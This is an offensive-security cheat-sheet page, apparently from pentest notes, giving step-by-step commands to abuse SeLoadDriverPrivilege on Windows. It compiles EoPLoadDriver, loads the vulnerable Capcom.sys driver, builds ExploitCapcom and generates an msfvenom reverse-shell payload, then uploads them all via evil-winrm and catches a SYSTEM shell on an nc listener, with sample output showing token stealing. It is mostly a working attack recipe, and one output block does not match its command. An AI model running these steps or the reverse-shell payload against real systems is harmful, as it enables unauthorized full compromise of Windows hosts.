---
title: "SeLoadDriverPrivilege"
date: 2024-7-18
tags: ["Exploitation", "SeLoadDriverPrivilege", "Privilege Escalation", "Windows", "Reverse Shell"]
---

### Abuse #1: Install malicious driver

#### 1. Compile eoploaddriver

```console
+---------------------------------------------------------------------------------------+
| 1. Open Visual Studio 2022                                                            |
| 2. Create a new project                                                               |
| 3. Project Template : C++ Console App                                                 |
| 4. Project Name     : Eoploaddriver                                                   |
| 5. Replace code     : eoploaddriver.cpp                                               |
| 6. Remove header    : `include "stdafx.h"`                                            |
| 7. Release -> x64                                                                     |
| 8. Build   -> Build Solution                                                          |
| 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.exe |
+---------------------------------------------------------------------------------------+
```

<small>*Ref: [eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)*</small>

#### 2. Download Capcom.sys

[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

#### 3. Compile ExploitCapcom

```console
+----------------------------------------------------------------------------------------+
| 1. Double click ExploitCapcom.sln                                                      |
| 2. Replace the payload to `TCHAR CommandLine[] = TEXT("C:\\ProgramData\\rev.exe");` |
| 3. Release -> x64                                                                      |
| 4. Build   -> Build Solution                                                           |
| 5. Exported to .\x64\Release\ExploitCapcom.exe                                         |
+----------------------------------------------------------------------------------------+
```

<small>*Ref: [ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom)*</small>

#### 3. Create stageless payload

```console
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f exe -o rev.exe
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```

#### 4. Upload

```console
# For example (evil-winrm)
upload EoPLoadDriver.exe C:\ProgramData\EoPLoadDriver.exe
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> upload EoPLoadDriver.exe C:\ProgramData\EoPLoadDriver.exe
                                        
Info: Uploading /home/kali/EoPLoadDriver.exe to C:\ProgramData\EoPLoadDriver.exe
                                        
Data: 20480 bytes of 20480 bytes copied
                                        
Info: Upload successful!
```

```console
upload Capcom.sys C:\ProgramData\Capcom.sys
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> upload Capcom.sys C:\ProgramData\Capcom.sys
                                        
Info: Uploading /home/kali/Capcom.sys to C:\ProgramData\Capcom.sys
                                        
Data: 14100 bytes of 14100 bytes copied
                                        
Info: Upload successful!
```

```console
upload ExploitCapcom.exe C:\ProgramData\ExploitCapcom.exe
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> upload ExploitCapcom.exe
                                        
Info: Uploading /home/kali/ExploitCapcom.exe to C:\programdata\ExploitCapcom.exe
                                        
Data: 335188 bytes of 335188 bytes copied
```

```console
upload rev.exe C:\ProgramData\rev.exe
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> upload rev.exe C:\ProgramData\rev.exe
                                        
Info: Uploading /home/kali/rev.exe to C:\ProgramData\rev.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
```

#### 5. Exploit

```console
# Start a nc listener
rlwrap nc -lvnp <LOCAL_PORT>
```

```console {class="sample-code"}
$ rlwrap nc -lvnp 1337                                                                                                    
listening on [any] 1337 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.193] 49855
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\programdata>whoami
whoami
nt authority\system
```

```console
C:\ProgramData\Eoploaddriver.exe System\CurrentControlSet\test C:\ProgramData\Capcom.sys
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> C:\ProgramData\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 000001937C0C0008
[+] Shellcode was executed
[+] Token stealing was successful
[-] CreateProcess() failed
```

```console
C:\ProgramData\ExploitCapcom.exe
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> C:\ProgramData\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 00000221D2140008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```